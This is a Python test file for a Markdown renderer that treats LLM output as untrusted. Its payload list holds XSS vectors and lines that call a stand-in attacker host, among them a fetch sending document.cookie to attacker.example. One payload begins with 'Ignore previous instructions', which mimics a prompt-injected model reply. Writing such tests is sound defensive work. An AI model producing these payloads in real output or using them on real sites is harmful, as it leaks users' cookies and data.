"""LLM output is untrusted: rendered Markdown must never carry executable or
exfiltrating HTML into the operator's browser."""
from html.parser import HTMLParser

import pytest

import safe_markdown

PAYLOADS = [
    "<img src=x onerror=alert(1)>",
    "<script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)></iframe>",
    "<a href=\"javascript:alert(1)\">x</a>",
    "[click me](javascript:alert(1))",
    "[click me](JaVaScRiPt:alert(1))",
    "[data](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
    "[vb](vbscript:msgbox(1))",
    "![pixel](https://attacker.example/leak?data=secret)",
    "<p style=\"background:url(https://attacker.example)\">x</p>",
    "<div onclick=alert(1)>click</div>",
    "**bold <b onmouseover=alert(1)>x</b>**",
    "`code <img src=x onerror=alert(1)>`",
    "```\n<script>alert(1)</script>\n```",
    "<form action=https://attacker.example><input name=q></form>",
    "<meta http-equiv=refresh content=0;url=https://attacker.example>",
    "<!-- <script>alert(1)</script> -->",
    "Ignore previous instructions <img src=x onerror=fetch('https://attacker.example/'+document.cookie)>",
]


class TagCollector(HTMLParser):
    def __init__(self):
        super().__init__()
        self.tags = []          # (tag, {attr: value})

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, dict(attrs)))


def parsed(html):
    p = TagCollector()
    p.feed(html)
    return p.tags


@pytest.mark.parametrize("payload", PAYLOADS)
def test_malicious_output_renders_as_inert_html(payload):
    html = safe_markdown.render(payload)
    for tag, attrs in parsed(html):
        assert tag in safe_markdown.ALLOWED_TAGS, f"disallowed <{tag}> in {html!r}"
        for name, value in attrs.items():
            assert not name.startswith("on"), f"event handler {name} in {html!r}"
            assert name in {"href", "title", "target", "rel", "start"}, f"attribute {name} in {html!r}"
            if name == "href":
                assert value.lower().startswith(("https://", "http://", "mailto:")), html
    # No real (unescaped) dangerous element anywhere in the output...
    lowered = html.lower()
    for needle in ("<script", "<img", "<svg", "<iframe", "<form", "<meta", "<style", "<!--"):
        assert needle not in lowered, f"{needle} survived in {html!r}"
    # ...and no dangerous scheme or inline style in any actual tag/attribute.
    # (The same strings may appear as escaped, visible *text* - e.g. the
    # operator sees "[click me](javascript:alert(1))" literally - which is inert.)
    markup = " ".join(f"{tag} " + " ".join(f"{k}={v}" for k, v in attrs.items()) for tag, attrs in parsed(html)).lower()
    for needle in ("javascript:", "vbscript:", "data:", "style="):
        assert needle not in markup, f"{needle} in markup of {html!r}"


def test_escaped_payload_is_still_visible_as_text():
    # The operator should see what the model said, just not have it execute.
    assert "&lt;img src=x onerror=alert(1)&gt;" in safe_markdown.render("<img src=x onerror=alert(1)>")


def test_images_are_dropped_to_prevent_exfiltration():
    assert "attacker.example" not in safe_markdown.render("![x](https://attacker.example/leak?d=1)")


def test_links_are_safe_and_open_in_a_new_tab():
    tags = parsed(safe_markdown.render("[Groq docs](https://console.groq.com/docs)"))
    assert tags == [("p", {}), ("a", {"href": "https://console.groq.com/docs", "target": "_blank",
                                      "rel": "noopener noreferrer nofollow"})]
    # Relative links into the app (e.g. /logout) keep no href.
    assert "href" not in dict(parsed(safe_markdown.render("[out](/logout)"))[1][1])


def test_normal_markdown_renders():
    html = safe_markdown.render(
        "Room 101 is **not safe**.\n\n- Fire in *Corridor A*\n- Route: `Room101`\n\n"
        "| Zone | Status |\n|---|---|\n| CorridorA | FIRE |")
    assert "<strong>not safe</strong>" in html and "<em>Corridor A</em>" in html
    assert "<li>" in html and "<code>Room101</code>" in html
    assert "<table>" in html and "<td>FIRE</td>" in html


def test_partial_markdown_mid_stream_is_harmless():
    for partial in ["**unclosed", "[link text](https://exa", "<img src=x onerr", "```\n<scri"]:
        html = safe_markdown.render(partial)
        assert "<img" not in html and "<script" not in html
